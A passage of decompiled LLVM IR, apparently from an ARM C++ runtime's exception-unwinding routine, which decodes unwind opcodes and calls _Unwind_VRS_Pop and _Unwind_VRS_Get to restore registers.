  store i1 %v7_192d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_192d0, label %dec_label_pc_192d8, label %dec_label_pc_19344

dec_label_pc_192d8:                               ; preds = %dec_label_pc_192d0
  %v0_192d8 = load i32, i32* @r5, align 4
  %v1_192d8 = add i32 %v0_192d8, 8
  %v2_192d8 = inttoptr i32 %v1_192d8 to i8*
  %v3_192d8 = load i8, i8* %v2_192d8, align 1
  %v4_192d8 = zext i8 %v3_192d8 to i32
  store i32 %v4_192d8, i32* %r3.global-to-local, align 4
  %v2_192dc = icmp eq i8 %v3_192d8, 0
  store i1 %v2_192dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192dc, label %dec_label_pc_192ec, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_192d8
  %v2_192e0 = add nsw i32 %v4_192d8, -1
  store i32 %v2_192e0, i32* %r3.global-to-local, align 4
  %v2_192e4 = trunc i32 %v2_192e0 to i8
  store i8 %v2_192e4, i8* %v2_192d8, align 1
  %v0_192e8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_192e8.pr.pr, label %.thread30.dec_label_pc_192ec_crit_edge, label %dec_label_pc_19320

.thread30.dec_label_pc_192ec_crit_edge:           ; preds = %.thread30
  %v0_192ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192ec

dec_label_pc_192ec:                               ; preds = %.thread30.dec_label_pc_192ec_crit_edge, %dec_label_pc_192d8
  %v2_19304 = phi i32 [ %v0_192ec.pre, %.thread30.dec_label_pc_192ec_crit_edge ], [ %v0_192d8, %dec_label_pc_192d8 ]
  %v1_192ec = add i32 %v2_19304, 9
  %v2_192ec = inttoptr i32 %v1_192ec to i8*
  %v3_192ec = load i8, i8* %v2_192ec, align 1
  %v4_192ec = zext i8 %v3_192ec to i32
  store i32 %v4_192ec, i32* %r3.global-to-local, align 4
  %v2_192f0 = icmp eq i8 %v3_192ec, 0
  store i1 %v2_192f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192f0, label %dec_label_pc_1933c, label %dec_label_pc_19300

dec_label_pc_19300:                               ; preds = %dec_label_pc_192ec
  %v1_19300 = add nsw i32 %v4_192ec, -1
  store i32 %v1_19300, i32* %r3.global-to-local, align 4
  %v1_19304 = trunc i32 %v1_19300 to i8
  store i8 %v1_19304, i8* %v2_192ec, align 1
  %v0_19308 = load i32, i32* @r5, align 4
  %v1_19308 = add i32 %v0_19308, 4
  %v2_19308 = inttoptr i32 %v1_19308 to i32*
  %v3_19308 = load i32, i32* %v2_19308, align 4
  store i32 %v3_19308, i32* %r2.global-to-local, align 4
  %v1_1930c = inttoptr i32 %v3_19308 to i32*
  %v2_1930c = load i32, i32* %v1_1930c, align 4
  store i32 %v2_1930c, i32* %r0.global-to-local, align 4
  %v4_1930c = add i32 %v3_19308, 4
  store i32 %v4_1930c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1930c, i32* %v2_19308, align 4
  %v0_19318 = load i32, i32* %r3.global-to-local, align 4
  %v1_19318 = trunc i32 %v0_19318 to i8
  %v2_19318 = load i32, i32* @r5, align 4
  %v3_19318 = add i32 %v2_19318, 8
  %v4_19318 = inttoptr i32 %v3_19318 to i8*
  store i8 %v1_19318, i8* %v4_19318, align 1
  %v0_1931c = load i32, i32* %r0.global-to-local, align 4
  %v1_1931c = load i32, i32* @r5, align 4
  %v2_1931c = inttoptr i32 %v1_1931c to i32*
  store i32 %v0_1931c, i32* %v2_1931c, align 4
  br label %dec_label_pc_19320

dec_label_pc_19320:                               ; preds = %.thread30, %dec_label_pc_19300
  %v0_19320 = load i32, i32* %r0.global-to-local, align 4
  %v3_19320 = udiv i32 %v0_19320, 16777216
  %v1_19324 = urem i32 %v3_19320, 16
  %v3_19328 = mul i32 %v0_19320, 256
  store i32 %v3_19328, i32* %r0.global-to-local, align 4
  %v1_1932c = add nuw nsw i32 %v1_19324, 1
  store i32 %v1_1932c, i32* %r2.global-to-local, align 4
  %v1_19330 = and i32 %v3_19320, 240
  store i32 %v1_19330, i32* %r3.global-to-local, align 4
  %v1_19334 = load i32, i32* @r5, align 4
  %v2_19334 = inttoptr i32 %v1_19334 to i32*
  store i32 %v3_19328, i32* %v2_19334, align 4
  %v0_19338 = load i32, i32* %r2.global-to-local, align 4
  %v1_19338 = load i32, i32* %r3.global-to-local, align 4
  %v4_19338 = mul i32 %v1_19338, 4096
  %v5_19338 = or i32 %v4_19338, %v0_19338
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_192ec, %dec_label_pc_19320
  %storemerge132 = phi i32 [ %v5_19338, %dec_label_pc_19320 ], [ 720897, %dec_label_pc_192ec ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1925c

dec_label_pc_19344:                               ; preds = %dec_label_pc_192d0
  %v1_19344 = and i32 %v0_18fb4, 252
  store i32 %v1_19344, i32* %r3.global-to-local, align 4
  %v7_19348 = icmp eq i32 %v1_19344, 180
  store i1 %v7_19348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19348, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_19344
  %v2_1934c = urem i32 %v0_18fb4, 4
  %v2_19354 = add nuw nsw i32 %v2_1934c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_19360 = or i32 %v2_19354, 262144
  store i32 %v2_19360, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1925c

bb157:                                            ; preds = %dec_label_pc_19344
  %v2_19350 = urem i32 %v0_192c0, 8
  %v2_19358 = add nuw nsw i32 %v2_19350, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_19368 = or i32 %v2_19358, 524288
  store i32 %v2_19368, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1925c

dec_label_pc_19370:                               ; preds = %dec_label_pc_19280
  %v0_19370 = load i32, i32* %ip.global-to-local, align 4
  %v7_19370 = icmp eq i32 %v0_19370, 198
  store i1 %v7_19370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19370, label %dec_label_pc_19378, label %dec_label_pc_1917c

dec_label_pc_19378:                               ; preds = %dec_label_pc_19370
  %v0_19378 = load i32, i32* @r5, align 4
  %v1_19378 = add i32 %v0_19378, 8
  %v2_19378 = inttoptr i32 %v1_19378 to i8*
  %v3_19378 = load i8, i8* %v2_19378, align 1
  %v4_19378 = zext i8 %v3_19378 to i32
  store i32 %v4_19378, i32* %r3.global-to-local, align 4
  %v2_1937c = icmp eq i8 %v3_19378, 0
  store i1 %v2_1937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1937c, label %dec_label_pc_1938c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19378
  %v2_19380 = add nsw i32 %v4_19378, -1
  store i32 %v2_19380, i32* %r3.global-to-local, align 4
  %v2_19384 = trunc i32 %v2_19380 to i8
  store i8 %v2_19384, i8* %v2_19378, align 1
  %v0_19388.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19388.pr.pr, label %.thread48.dec_label_pc_1938c_crit_edge, label %dec_label_pc_193c0

.thread48.dec_label_pc_1938c_crit_edge:           ; preds = %.thread48
  %v0_1938c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1938c

dec_label_pc_1938c:                               ; preds = %.thread48.dec_label_pc_1938c_crit_edge, %dec_label_pc_19378
  %v2_193a4 = phi i32 [ %v0_1938c.pre, %.thread48.dec_label_pc_1938c_crit_edge ], [ %v0_19378, %dec_label_pc_19378 ]
  %v1_1938c = add i32 %v2_193a4, 9
  %v2_1938c = inttoptr i32 %v1_1938c to i8*
  %v3_1938c = load i8, i8* %v2_1938c, align 1
  %v4_1938c = zext i8 %v3_1938c to i32
  store i32 %v4_1938c, i32* %r3.global-to-local, align 4
  %v2_19390 = icmp eq i8 %v3_1938c, 0
  store i1 %v2_19390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19390, label %dec_label_pc_193dc, label %dec_label_pc_193a0

dec_label_pc_193a0:                               ; preds = %dec_label_pc_1938c
  %v1_193a0 = add nsw i32 %v4_1938c, -1
  store i32 %v1_193a0, i32* %r3.global-to-local, align 4
  %v1_193a4 = trunc i32 %v1_193a0 to i8
  store i8 %v1_193a4, i8* %v2_1938c, align 1
  %v0_193a8 = load i32, i32* @r5, align 4
  %v1_193a8 = add i32 %v0_193a8, 4
  %v2_193a8 = inttoptr i32 %v1_193a8 to i32*
  %v3_193a8 = load i32, i32* %v2_193a8, align 4
  store i32 %v3_193a8, i32* %r2.global-to-local, align 4
  %v1_193ac = inttoptr i32 %v3_193a8 to i32*
  %v2_193ac = load i32, i32* %v1_193ac, align 4
  store i32 %v2_193ac, i32* %r0.global-to-local, align 4
  %v4_193ac = add i32 %v3_193a8, 4
  store i32 %v4_193ac, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_193ac, i32* %v2_193a8, align 4
  %v0_193b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_193b8 = trunc i32 %v0_193b8 to i8
  %v2_193b8 = load i32, i32* @r5, align 4
  %v3_193b8 = add i32 %v2_193b8, 8
  %v4_193b8 = inttoptr i32 %v3_193b8 to i8*
  store i8 %v1_193b8, i8* %v4_193b8, align 1
  %v0_193bc = load i32, i32* %r0.global-to-local, align 4
  %v1_193bc = load i32, i32* @r5, align 4
  %v2_193bc = inttoptr i32 %v1_193bc to i32*
  store i32 %v0_193bc, i32* %v2_193bc, align 4
  br label %dec_label_pc_193c0

dec_label_pc_193c0:                               ; preds = %.thread48, %dec_label_pc_193a0
  %v0_193c0 = load i32, i32* %r0.global-to-local, align 4
  %v3_193c0 = udiv i32 %v0_193c0, 16777216
  %v1_193c4 = urem i32 %v3_193c0, 16
  %v3_193c8 = mul i32 %v0_193c0, 256
  store i32 %v3_193c8, i32* %r0.global-to-local, align 4
  %v1_193cc = add nuw nsw i32 %v1_193c4, 1
  store i32 %v1_193cc, i32* %r2.global-to-local, align 4
  %v1_193d0 = and i32 %v3_193c0, 240
  store i32 %v1_193d0, i32* %r3.global-to-local, align 4
  %v1_193d4 = load i32, i32* @r5, align 4
  %v2_193d4 = inttoptr i32 %v1_193d4 to i32*
  store i32 %v3_193c8, i32* %v2_193d4, align 4
  %v0_193d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_193d8 = load i32, i32* %r3.global-to-local, align 4
  %v4_193d8 = mul i32 %v1_193d8, 4096
  %v5_193d8 = or i32 %v4_193d8, %v0_193d8
  br label %dec_label_pc_193dc

dec_label_pc_193dc:                               ; preds = %dec_label_pc_1938c, %dec_label_pc_193c0
  %storemerge131 = phi i32 [ %v5_193d8, %dec_label_pc_193c0 ], [ 720897, %dec_label_pc_1938c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1925c

dec_label_pc_193e4:                               ; preds = %dec_label_pc_191a0
  %v0_193e4 = load i32, i32* @r5, align 4
  %v1_193e4 = add i32 %v0_193e4, 8
  %v2_193e4 = inttoptr i32 %v1_193e4 to i8*
  %v3_193e4 = load i8, i8* %v2_193e4, align 1
  %v4_193e4 = zext i8 %v3_193e4 to i32
  store i32 %v4_193e4, i32* %r3.global-to-local, align 4
  %v2_193e8 = icmp eq i8 %v3_193e4, 0
  store i1 %v2_193e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193e8, label %dec_label_pc_193f8, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_193e4
  %v2_193ec = add nsw i32 %v4_193e4, -1
  store i32 %v2_193ec, i32* %r3.global-to-local, align 4
  %v2_193f0 = trunc i32 %v2_193ec to i8
  store i8 %v2_193f0, i8* %v2_193e4, align 1
  %v0_193f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_193f4.pr.pr, label %.thread52.dec_label_pc_193f8_crit_edge, label %dec_label_pc_1942c

.thread52.dec_label_pc_193f8_crit_edge:           ; preds = %.thread52
  %v0_193f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193f8

dec_label_pc_193f8:                               ; preds = %.thread52.dec_label_pc_193f8_crit_edge, %dec_label_pc_193e4
  %v2_19410 = phi i32 [ %v0_193f8.pre, %.thread52.dec_label_pc_193f8_crit_edge ], [ %v0_193e4, %dec_label_pc_193e4 ]
  %v1_193f8 = add i32 %v2_19410, 9
  %v2_193f8 = inttoptr i32 %v1_193f8 to i8*
  %v3_193f8 = load i8, i8* %v2_193f8, align 1
  %v4_193f8 = zext i8 %v3_193f8 to i32
  store i32 %v4_193f8, i32* %r3.global-to-local, align 4
  %v2_193fc = icmp eq i8 %v3_193f8, 0
  store i1 %v2_193fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193fc, label %dec_label_pc_19448, label %dec_label_pc_1940c

dec_label_pc_1940c:                               ; preds = %dec_label_pc_193f8
  %v1_1940c = add nsw i32 %v4_193f8, -1
  store i32 %v1_1940c, i32* %r3.global-to-local, align 4
  %v1_19410 = trunc i32 %v1_1940c to i8
  store i8 %v1_19410, i8* %v2_193f8, align 1
  %v0_19414 = load i32, i32* @r5, align 4
  %v1_19414 = add i32 %v0_19414, 4
  %v2_19414 = inttoptr i32 %v1_19414 to i32*
  %v3_19414 = load i32, i32* %v2_19414, align 4
  store i32 %v3_19414, i32* %r2.global-to-local, align 4
  %v1_19418 = inttoptr i32 %v3_19414 to i32*
  %v2_19418 = load i32, i32* %v1_19418, align 4
  store i32 %v2_19418, i32* %r0.global-to-local, align 4
  %v4_19418 = add i32 %v3_19414, 4
  store i32 %v4_19418, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19418, i32* %v2_19414, align 4
  %v0_19424 = load i32, i32* %r3.global-to-local, align 4
  %v1_19424 = trunc i32 %v0_19424 to i8
  %v2_19424 = load i32, i32* @r5, align 4
  %v3_19424 = add i32 %v2_19424, 8
  %v4_19424 = inttoptr i32 %v3_19424 to i8*
  store i8 %v1_19424, i8* %v4_19424, align 1
  %v0_19428 = load i32, i32* %r0.global-to-local, align 4
  %v1_19428 = load i32, i32* @r5, align 4
  %v2_19428 = inttoptr i32 %v1_19428 to i32*
  store i32 %v0_19428, i32* %v2_19428, align 4
  br label %dec_label_pc_1942c

dec_label_pc_1942c:                               ; preds = %.thread52, %dec_label_pc_1940c
  %v0_1942c = load i32, i32* %r0.global-to-local, align 4
  %v3_1942c = udiv i32 %v0_1942c, 16777216
  %v1_19430 = urem i32 %v3_1942c, 16
  %v3_19434 = mul i32 %v0_1942c, 256
  store i32 %v3_19434, i32* %r0.global-to-local, align 4
  %v1_19438 = add nuw nsw i32 %v1_19430, 1
  store i32 %v1_19438, i32* %r2.global-to-local, align 4
  %v1_1943c = and i32 %v3_1942c, 240
  store i32 %v1_1943c, i32* %r3.global-to-local, align 4
  %v1_19440 = load i32, i32* @r5, align 4
  %v2_19440 = inttoptr i32 %v1_19440 to i32*
  store i32 %v3_19434, i32* %v2_19440, align 4
  %v0_19444 = load i32, i32* %r2.global-to-local, align 4
  %v1_19444 = load i32, i32* %r3.global-to-local, align 4
  %v4_19444 = mul i32 %v1_19444, 4096
  %v5_19444 = or i32 %v4_19444, %v0_19444
  br label %dec_label_pc_19448

dec_label_pc_19448:                               ; preds = %dec_label_pc_193f8, %dec_label_pc_1942c
  %storemerge130 = phi i32 [ %v5_19444, %dec_label_pc_1942c ], [ 720897, %dec_label_pc_193f8 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1925c

dec_label_pc_19450:                               ; preds = %dec_label_pc_1917c
  %v0_19450 = load i32, i32* @r5, align 4
  %v1_19450 = add i32 %v0_19450, 8
  %v2_19450 = inttoptr i32 %v1_19450 to i8*
  %v3_19450 = load i8, i8* %v2_19450, align 1
  %v4_19450 = zext i8 %v3_19450 to i32
  store i32 %v4_19450, i32* %r3.global-to-local, align 4
  %v2_19454 = icmp eq i8 %v3_19450, 0
  store i1 %v2_19454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19454, label %dec_label_pc_195fc, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_19450
  %v2_19458 = add nsw i32 %v4_19450, -1
  store i32 %v2_19458, i32* %r3.global-to-local, align 4
  %v2_1945c = trunc i32 %v2_19458 to i8
  store i8 %v2_1945c, i8* %v2_19450, align 1
  %v0_19460.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19460.pr.pr, label %.thread56.dec_label_pc_195fc_crit_edge, label %dec_label_pc_19464

.thread56.dec_label_pc_195fc_crit_edge:           ; preds = %.thread56
  %v0_195fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_195fc

dec_label_pc_19464:                               ; preds = %.thread56, %dec_label_pc_19608
  %v0_19464 = load i32, i32* %r0.global-to-local, align 4
  %v3_19464 = udiv i32 %v0_19464, 16777216
  store i32 %v3_19464, i32* %r3.global-to-local, align 4
  store i32 %v3_19464, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_19464, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1946c = mul i32 %v0_19464, 256
  store i32 %v3_1946c, i32* %r0.global-to-local, align 4
  %v1_19470 = load i32, i32* @r5, align 4
  %v2_19470 = inttoptr i32 %v1_19470 to i32*
  store i32 %v3_1946c, i32* %v2_19470, align 4
  br i1 %tmp184, label %dec_label_pc_1922c, label %dec_label_pc_19478

dec_label_pc_19478:                               ; preds = %dec_label_pc_19464
  %v0_19478 = load i32, i32* %r3.global-to-local, align 4
  %v1_19478 = and i32 %v0_19478, 240
  store i32 %v1_19478, i32* %r3.global-to-local, align 4
  %v2_19478 = icmp eq i32 %v1_19478, 0
  store i1 %v2_19478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19478, label %dec_label_pc_19480, label %dec_label_pc_1922c

dec_label_pc_19480:                               ; preds = %dec_label_pc_19478
  %v0_19480 = load i32, i32* @r7, align 4
  store i32 %v0_19480, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19488 = load i32, i32* %r2.global-to-local, align 4
  %v4_19488 = call i32 @_Unwind_VRS_Pop(i32 %v0_19480, i32 4, i32 %v2_19488, i32 0)
  store i32 %v4_19488, i32* %r0.global-to-local, align 4
  %v2_1948c = icmp eq i32 %v4_19488, 0
  store i1 %v2_1948c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1948c, label %dec_label_pc_18f5c.backedge, label %dec_label_pc_19494

dec_label_pc_19494:                               ; preds = %dec_label_pc_19480
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19084

dec_label_pc_1949c:                               ; preds = %dec_label_pc_192c8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_194a8 = load i32, i32* @r7, align 4
  store i32 %v0_194a8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_194b4 = call i32 @_Unwind_VRS_Get(i32 %v0_194a8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_194b4, i32* %r0.global-to-local, align 4
  %v0_194b8 = load i32, i32* @r5, align 4
  %v1_194b8 = add i32 %v0_194b8, 8
  %v2_194b8 = inttoptr i32 %v1_194b8 to i8*
  %v3_194b8 = load i8, i8* %v2_194b8, align 1
  %v4_194b8 = zext i8 %v3_194b8 to i32
  store i32 %v4_194b8, i32* %r1.global-to-local, align 4
  %v2_194bc = icmp eq i8 %v3_194b8, 0
  store i1 %v2_194bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194bc, label %dec_label_pc_194cc, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1949c
  %v2_194c0 = add nsw i32 %v4_194b8, -1
  store i32 %v2_194c0, i32* %r3.global-to-local, align 4
  %v2_194c4 = trunc i32 %v2_194c0 to i8
  store i8 %v2_194c4, i8* %v2_194b8, align 1
  %v0_194c8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_194c8.pr.pr, label %.thread58.dec_label_pc_194cc_crit_edge, label %dec_label_pc_194f8

.thread58.dec_label_pc_194cc_crit_edge:           ; preds = %.thread58
  %v0_194cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_194cc

dec_label_pc_194cc:                               ; preds = %.thread58.dec_label_pc_194cc_crit_edge, %dec_label_pc_1949c
  %v2_194e0 = phi i32 [ %v0_194cc.pre, %.thread58.dec_label_pc_194cc_crit_edge ], [ %v0_194b8, %dec_label_pc_1949c ]
  %v1_194cc = add i32 %v2_194e0, 9
  %v2_194cc = inttoptr i32 %v1_194cc to i8*
  %v3_194cc = load i8, i8* %v2_194cc, align 1
  %v4_194cc = zext i8 %v3_194cc to i32
  store i32 %v4_194cc, i32* %r3.global-to-local, align 4
  %v2_194d0 = icmp eq i8 %v3_194cc, 0
  store i1 %v2_194d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_194d0, label %bb158, label %dec_label_pc_194dc

bb158:                                            ; preds = %dec_label_pc_194cc
  %v1_194d4 = load i32, i32* @r6, align 4
  store i32 %v1_194d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19520

dec_label_pc_194dc:                               ; preds = %dec_label_pc_194cc
  %v1_194dc = add nsw i32 %v4_194cc, -1
  store i32 %v1_194dc, i32* %r3.global-to-local, align 4
  %v1_194e0 = trunc i32 %v1_194dc to i8
  store i8 %v1_194e0, i8* %v2_194cc, align 1
  %v0_194e4 = load i32, i32* @r5, align 4
  %v1_194e4 = add i32 %v0_194e4, 4
  %v2_194e4 = inttoptr i32 %v1_194e4 to i32*
  %v3_194e4 = load i32, i32* %v2_194e4, align 4
  store i32 %v3_194e4, i32* %r2.global-to-local, align 4
  %v1_194e8 = inttoptr i32 %v3_194e4 to i32*
  %v2_194e8 = load i32, i32* %v1_194e8, align 4
  store i32 %v2_194e8, i32* %r0.global-to-local, align 4
  %v4_194e8 = add i32 %v3_194e4, 4
  store i32 %v4_194e8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_194f0 = inttoptr i32 %v0_194e4 to i32*
  store i32 %v2_194e8, i32* %v1_194f0, align 4
  %v5_194f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_194f0, i32* %v2_194e4, align 4
  %v0_194f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_194f4 = trunc i32 %v0_194f4 to i8
  %v2_194f4 = load i32, i32* @r5, align 4
  %v3_194f4 = add i32 %v2_194f4, 8
  %v4_194f4 = inttoptr i32 %v3_194f4 to i8*
  store i8 %v1_194f4, i8* %v4_194f4, align 1
  br label %dec_label_pc_194f8

dec_label_pc_194f8:                               ; preds = %.thread58, %dec_label_pc_194dc
  %v0_194f8 = load i32, i32* @r5, align 4
  %v1_194f8 = inttoptr i32 %v0_194f8 to i32*
  %v2_194f8 = load i32, i32* %v1_194f8, align 4
  store i32 %v2_194f8, i32* %r3.global-to-local, align 4
  %v3_194fc = mul i32 %v2_194f8, 256
  store i32 %v3_194fc, i32* %r0.global-to-local, align 4
  %v3_19500 = udiv i32 %v2_194f8, 16777216
  store i32 %v3_19500, i32* %r2.global-to-local, align 4
  store i32 %v3_194fc, i32* %v1_194f8, align 4
  %v0_19508 = load i32, i32* %r2.global-to-local, align 4
  %v1_19508 = and i32 %v0_19508, 128
  %v2_19508 = icmp eq i32 %v1_19508, 0
  store i1 %v2_19508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19508, label %.thread129, label %dec_label_pc_1951c

.thread129:                                       ; preds = %dec_label_pc_194f8
  %v4_1950c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1950c, i32* %ip.global-to-local, align 4
  %v1_19510 = urem i32 %v0_19508, 256
  store i32 %v1_19510, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19590

dec_label_pc_1951c:                               ; preds = %dec_label_pc_194f8
  %v1_1951063 = urem i32 %v0_19508, 256
  store i32 %v1_1951063, i32* %r2.global-to-local, align 4
  %v0_1951c = load i32, i32* @r5, align 4
  %v1_1951c = add i32 %v0_1951c, 8
  %v2_1951c = inttoptr i32 %v1_1951c to i8*
  %v3_1951c = load i8, i8* %v2_1951c, align 1
  %v4_1951c = zext i8 %v3_1951c to i32
  store i32 %v4_1951c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19520

dec_label_pc_19520:                               ; preds = %bb158, %dec_label_pc_1951c
  %v3_1954099 = phi i32 [ %v2_194e0, %bb158 ], [ %v0_1951c, %dec_label_pc_1951c ]
  %v0_1952892 = phi i32 [ %v1_194d4, %bb158 ], [ %v1_1951063, %dec_label_pc_1951c ]
  %v3_19520 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_19520, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %dec_label_pc_19528.backedge, %dec_label_pc_19520
  %v3_19540 = phi i32 [ %v3_19540100, %dec_label_pc_19528.backedge ], [ %v3_1954099, %dec_label_pc_19520 ]
  %v0_1953c = phi i32 [ %v2_1952c.pre, %dec_label_pc_19528.backedge ], [ 2, %dec_label_pc_19520 ]
  %v0_1952c = phi i32 [ %v0_1952c.pre, %dec_label_pc_19528.backedge ], [ %v3_19520, %dec_label_pc_19520 ]
  %v0_19528 = phi i32 [ %v0_1952895, %dec_label_pc_19528.backedge ], [ %v0_1952892, %dec_label_pc_19520 ]
  %v1_19528 = urem i32 %v0_19528, 128
  %v7_1952c = shl i32 %v1_19528, %v0_1953c
  %v8_1952c = add i32 %v7_1952c, %v0_1952c
  store i32 %v8_1952c, i32* %ip.global-to-local, align 4
  %v0_19530 = load i32, i32* %r1.global-to-local, align 4
  %v2_19530 = icmp eq i32 %v0_19530, 0
  store i1 %v2_19530, i1* %cpsr_z.global-to-local, align 1
  %v1_19534 = add i32 %v0_19530, -1
  store i32 %v1_19534, i32* %r3.global-to-local, align 4
  store i32 %v8_1952c, i32* %stack_var_-36, align 4
  %v1_1953c = add i32 %v0_1953c, 7
  store i32 %v1_1953c, i32* @lr, align 4
  br i1 %v2_19530, label %dec_label_pc_19548, label %bb159

bb159:                                            ; preds = %dec_label_pc_19528
  %v2_19540 = trunc i32 %v1_19534 to i8
  %v4_19540 = add i32 %v3_19540, 8
  %v5_19540 = inttoptr i32 %v4_19540 to i8*
  store i8 %v2_19540, i8* %v5_19540, align 1
  %v0_19544.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19544.pr, label %.dec_label_pc_19548_crit_edge, label %dec_label_pc_19574

.dec_label_pc_19548_crit_edge:                    ; preds = %bb159
  %v0_19548.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19548

dec_label_pc_19548:                               ; preds = %.dec_label_pc_19548_crit_edge, %dec_label_pc_19528
  %v2_19560 = phi i32 [ %v0_19548.pre, %.dec_label_pc_19548_crit_edge ], [ %v3_19540, %dec_label_pc_19528 ]
  %v1_19548 = add i32 %v2_19560, 9
  %v2_19548 = inttoptr i32 %v1_19548 to i8*
  %v3_19548 = load i8, i8* %v2_19548, align 1
  %v4_19548 = zext i8 %v3_19548 to i32
  store i32 %v4_19548, i32* %r3.global-to-local, align 4
  %v2_1954c = icmp eq i8 %v3_19548, 0
  store i1 %v2_1954c, i1* %cpsr_z.global-to-local, align 1
  %v1_19550 = add nsw i32 %v4_19548, -1
  store i32 %v1_19550, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1954c, label %dec_label_pc_19528.backedge, label %dec_label_pc_1955c

dec_label_pc_1955c:                               ; preds = %dec_label_pc_19548
  %v1_1955c = add i32 %v2_19560, 4
  %v2_1955c = inttoptr i32 %v1_1955c to i32*
  %v3_1955c = load i32, i32* %v2_1955c, align 4
  store i32 %v3_1955c, i32* %r2.global-to-local, align 4
  %v1_19560 = trunc i32 %v1_19550 to i8
  store i8 %v1_19560, i8* %v2_19548, align 1
  %v0_19564 = load i32, i32* %r2.global-to-local, align 4
  %v1_19564 = inttoptr i32 %v0_19564 to i32*
  %v2_19564 = load i32, i32* %v1_19564, align 4
  store i32 %v2_19564, i32* %r0.global-to-local, align 4
  %v4_19564 = add i32 %v0_19564, 4
  store i32 %v4_19564, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1956c = load i32, i32* @r5, align 4
  %v3_1956c = add i32 %v2_1956c, 8
  %v4_1956c = inttoptr i32 %v3_1956c to i8*
  store i8 3, i8* %v4_1956c, align 1
  %v0_19570 = load i32, i32* @r5, align 4
  %v1_19570 = inttoptr i32 %v0_19570 to i32*
  %v2_19570 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19570, i32* %v1_19570, align 4
  %v3_19570 = add i32 %v0_19570, 4
  %v4_19570 = inttoptr i32 %v3_19570 to i32*
  %v5_19570 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19570, i32* %v4_19570, align 4
  br label %dec_label_pc_19574

dec_label_pc_19574:                               ; preds = %bb159, %dec_label_pc_1955c
  %v0_19574 = load i32, i32* @r5, align 4
  %v1_19574 = inttoptr i32 %v0_19574 to i32*
  %v2_19574 = load i32, i32* %v1_19574, align 4
  store i32 %v2_19574, i32* %r3.global-to-local, align 4
  %v3_19578 = udiv i32 %v2_19574, 16777216
  store i32 %v3_19578, i32* %r2.global-to-local, align 4
